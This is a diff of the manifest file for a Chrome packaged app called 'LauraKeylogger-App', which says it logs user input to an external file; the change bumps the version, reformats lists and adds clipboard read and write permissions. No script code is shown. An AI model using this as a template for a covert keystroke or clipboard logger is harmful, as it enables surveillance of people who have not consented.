@@ -1,14 +1,30 @@
 {
   "name": "LauraKeylogger-App",
   "description": "This application connects to the extension and log data to an external file the user input.",
-  "version": "0.3",
+  "version": "0.6",
   "minimum_chrome_version": "31",
   "manifest_version": 2,
   "app": {
     "background": {
-      "scripts": ["appid.js", "config.js", "storage.js", "main.js"]
+      "scripts": [
+        "appid.js", 
+        "config.js", 
+        "storage.js", 
+        "main.js"
+      ]
     }
   },
-  "permissions": [ "storage", "unlimitedStorage", {"fileSystem": ["write"]} ],
-  "icons": { "16": "icons/icon16.png", "48": "icons/icon48.png", "64":"icons/icon64.png", "128": "icons/icon128.png" }
+  "permissions": [ 
+      "storage", 
+      "unlimitedStorage", 
+      {"fileSystem": ["write"] }, 
+      "clipboardRead", 
+      "clipboardWrite" 
+    ],
+  "icons": { 
+      "16": "icons/icon16.png", 
+      "48": "icons/icon48.png", 
+      "64":"icons/icon64.png", 
+      "128": "icons/icon128.png" 
+    }
 }
